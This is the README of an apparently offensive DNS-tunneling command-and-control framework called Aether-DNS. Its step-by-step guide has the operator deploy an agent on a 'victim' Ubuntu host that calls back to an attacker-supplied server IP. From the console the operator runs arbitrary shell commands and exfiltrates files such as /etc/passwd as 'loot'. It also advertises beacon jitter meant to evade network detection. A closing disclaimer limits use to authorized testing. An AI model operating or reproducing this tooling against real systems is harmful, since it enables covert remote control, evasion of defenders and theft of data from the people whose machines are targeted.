# Aether-DNS: Operational DNS-Tunneling C2 Framework

Aether-DNS is a production-ready proof-of-concept Command and Control (C2) framework demonstrating secure, stateful application-layer data streaming over the Domain Name System (DNS) protocol. It incorporates advanced operational security (OpSec) primitives to simulate real-world threat actor communication profiles during authorized purple team engagements and academic research.

## 🛠️ Architectural Features

- **Authenticated Cryptography (AEAD):** All upstream and downstream domain payloads are natively encrypted using AES-256-GCM containing randomized Initialization Vectors (IV) to prevent replay attacks or network pattern mapping.
- **Selective Repeat Retransmission:** Built-in validation auditing logic tracks packet arrival indices over stateless UDP lines, requesting specific missing frames dynamically without full-stream re-transmission overhead.
- **Dynamic Argument Architecture:** Zero hardcoded IP indicators within the implant footprint. All deployment targeting variables are supplied dynamically at runtime.
- **Malleable Anomaly Jitter:** Embedded variable beacon interval timing engine introduces customizable randomness ranges to disrupt standard network heuristics detection models.
- **Zero Third-Party Agent Dependencies:** Built completely using native standard-library pipelines for maximum portability on core target execution systems.

## 📦 Prerequisites

To support the AES-GCM authenticated encryption modules, the host environment must contain the industry-standard cryptographic primitives library:

```bash
pip3 install pycryptodome
```

---

## 🚀 Usage & Operation Guide

Follow these steps sequentially to configure your network infrastructure, initialize the listener engine, and deploy the agent session.

### Step 1: Environment & Network Configuration
Before launching the server, verify that the attacking controller machine can accept inbound traffic on **UDP Port 53**. On standard Linux systems, the local DNS stub resolver (`systemd-resolved`) binds to this port by default and must be cleared. 

The server script automatically handles this on startup by temporarily stopping the local resolver daemon:
```bash
# Verify port 53 is clear or ready for binding
sudo netstat -leupn | grep 53
```

### Step 2: Initialize the Authoritative Server
Launch the C2 controller on your management server with administrative privileges. The script will clear the port conflict, bind to all interfaces, and wait for inbound client beacons:

```bash
sudo python3 aether_server.py
```

### Step 3: Deploy the Target Agent
Move `aether_agent.py` to the victim Ubuntu instance. Execute the agent binary natively from the terminal. You must provide the attacker's server IP via the runtime parameters; the domain argument defaults to `aether.internal` unless modified:

```bash
# Standard execution targeting the C2 controller instance
python3 aether_agent.py --server 192.168.1.100

# Custom execution overriding both the server IP and domain zone
python3 aether_agent.py --server 10.0.0.50 --domain tactical.infra
```

### Step 4: Interact with the C2 Console Menu
Once the agent begins beaconing home (every 3–5 seconds due to randomized jitter thresholds), the server's command terminal will present an interactive menu prompt. Select an integer option (1-3) to queue a command for the agent's next check-in cycle:

```text
=== AETHER COMMAND CONSOLE ===
1: List Directory | 2: Run Command | 3: Fetch File | 5: Terminate
> 1
Parameter: /var/log
```

- **Option 1 (List Directory):** Enter any directory path (e.g., `/etc` or `/var/www`). Leave blank or enter `.` for the client's local execution directory.
- **Option 2 (Run Command):** Type any native shell sequence string (e.g., `whoami`, `id`, or `uname -a`). The client captures and streams back the console pipeline output.
- **Option 3 (Fetch File):** Enter the exact path to a file on the target system (e.g., `/etc/passwd`). The client archives, encrypts, chunks, and reconstructs the file locally on your server as a `loot_*` file.
- **Option 5 (Terminate Server):** Gracefully exits the controller loop and automatically triggers system recovery to restore the original `systemd-resolved` network state.

---

## ⚖️ Legal Disclaimer
This framework is developed solely for authorized testing, academic analysis, and architectural evaluation. Utilizing this software against production infrastructure without documented authorization is unlawful.

